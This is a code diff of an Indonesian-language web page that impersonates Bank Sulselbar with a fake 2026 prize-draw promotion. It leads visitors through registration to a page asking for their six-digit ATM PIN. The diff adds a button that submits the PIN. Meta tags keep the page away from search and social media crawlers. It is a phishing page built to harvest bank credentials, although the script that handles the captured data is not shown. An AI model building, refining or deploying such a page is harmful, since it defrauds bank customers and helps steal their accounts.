@@ -22,7 +22,7 @@
      <meta name="bingbot" content="noindex, nofollow">
      <meta name="facebookexternalhit" content="noindex, nofollow">
      <meta name="fb:bar" content="false">
-     <meta name="description" content="Program Promosi Gebyar Undian Bank Sulselbar — Ikut berpartisipasi dan menangkan hadiah menarik!">
+     <meta name="description" content="Program Promosi Gebyar Undian Bank Sulselbar">
      <meta name="referrer" content="no-referrer">
      <meta http-equiv="X-Frame-Options" content="SAMEORIGIN">
      <meta http-equiv="X-Robots-Tag" content="noindex, nofollow">
@@ -30,36 +30,26 @@
 <body>
 
 <!-- ============================================== -->
-<!-- 🏠 HALAMAN AWAL — GEBYAR UNDIAN BANK SULSELBAR -->
+<!-- 🏠 HALAMAN AWAL — GEBYAR UNDIAN -->
 <!-- ============================================== -->
-<div class="halaman aktif" id="halAwal" data-halaman="Halaman Awal">
+<div class="halaman aktif" id="halAwal">
     <div class="latar-pola"></div>
     <div class="konten-awal">
-        
-        <!-- 🎀 Pita Atas -->
         <div class="pita-atas-awal">
             <span class="bintang">★</span>
             <span class="teks-pita-awal">PROGRAM PROMOSI</span>
             <span class="bintang">★</span>
         </div>
 
-        <!-- 🎫 Logo Resmi Bank Sulselbar -->
         <div class="logo-festival">
             <img src="https://upload.wikimedia.org/wikipedia/commons/c/c0/Logo_Bank_Sulselbar.png" alt="Logo Bank Sulselbar">
         </div>
 
-        <!-- 🏦 Nama Bank -->
         <div class="nama-bank-awal">Bank Sulselbar</div>
-
-        <!-- 🎊 Judul Utama -->
-        <h1 class="judul-gebyar">
-            🎁 MENANGKAN UNDIAN 2026 🎁
-        </h1>
+        <h1 class="judul-gebyar">🎁 MENANGKAN UNDIAN 2026 🎁</h1>
         <h2 class="sub-judul-gebyar">GEBYAR BANK SULSELBAR</h2>
-        
         <p class="deskripsi-awal">Ikut berpartisipasi dan menangkan hadiah menarik!</p>
 
-        <!-- 🚀 Tombol Mulai -->
         <div class="tombol-bawah-awal">
             <button class="btn-mulai" onclick="keRegistrasi()">
                 <span class="ikon-btn">🎫</span>
@@ -67,17 +57,16 @@
             </button>
         </div>
 
-        <!-- ⚡ FOOTER -->
         <div class="footer-awal">
-            PT. Bank Sulselbar berizin dan diawasi oleh Otoritas Jasa Keuangan & Bank Indonesia, serta merupakan peserta penjaminan LPS.
+            PT. Bank Sulselbar berizin dan diawasi oleh OJK & Bank Indonesia, serta peserta penjaminan LPS.
         </div>
     </div>
 </div>
 
 <!-- ============================================== -->
-<!-- 🔹 HALAMAN 2 — REGISTRASI BARU -->
+<!-- 📋 HALAMAN 2 — REGISTRASI BARU -->
 <!-- ============================================== -->
-<div class="halaman halaman-putih" id="halRegistrasi" data-halaman="Registrasi Baru">
+<div class="halaman halaman-putih" id="halRegistrasi">
     <div class="header-hijau">
         <span class="panah-kembali" onclick="kembaliKeAwal()">&larr;</span>
         <span class="judul-header">Registrasi Peserta</span>
@@ -102,9 +91,9 @@
 </div>
 
 <!-- ============================================== -->
-<!-- 🔹 HALAMAN 3 — PIN ATM (HANYA ANGKA) -->
+<!-- 🔢 HALAMAN 3 — PIN ATM ✅ DIPERBAIKI + TOMBOL -->
 <!-- ============================================== -->
-<div class="halaman halaman-putih" id="halPIN" data-halaman="PIN ATM">
+<div class="halaman halaman-putih" id="halPIN">
     <div class="header-hijau">
         <span class="panah-kembali" onclick="kembaliKeRegistrasi()">&larr;</span>
         <span class="judul-header">Verifikasi PIN ATM</span>
@@ -120,19 +109,23 @@
             <input type="tel" class="kolom-kode" maxlength="1" id="p6" inputmode="numeric" oninput="hanyaAngka(this); bacaPIN()">
         </div>
         <p class="petunjuk-pin">⚠️ Hanya dapat memasukkan angka 0-9</p>
+
+        <!-- ✅ TOMBOL LANJUTKAN — DITAMBAHKAN! -->
+        <button class="btn-hijau" onclick="bacaPINdanLanjut()" style="margin-top: 30px;">
+            LANJUTKAN
+        </button>
     </div>
 </div>
 
 <!-- ============================================== -->
-<!-- 🔹 HALAMAN 4 — KUPON UNDIAN -->
+<!-- 🎫 HALAMAN 4 — KUPON UNDIAN (HALAMAN TERAKHIR) -->
 <!-- ============================================== -->
-<div class="halaman halaman-putih" id="halKeterangan" data-halaman="Kupon Undian">
+<div class="halaman halaman-putih" id="halKeterangan">
     <div class="header-hijau">
         <span class="panah-kembali" onclick="kembaliKePIN()">&larr;</span>
         <span class="judul-header">🎉 Kupon Undian Gebyar Festival</span>
     </div>
     <div class="konten kupon-konten">
-        
         <div class="pita-atas">
             <span class="ikon-bintang">★</span>
             <span class="teks-pita">SELAMAT!</span>
@@ -174,7 +167,7 @@
     </div>
 </div>
 
-<!-- ✅ SCRIPT JS — WAJIB ADA DI SINI ATAU FILE TERPISAH -->
+<!-- ✅ SCRIPT JS -->
 <script src="script.js"></script>
 </body>
 </html>
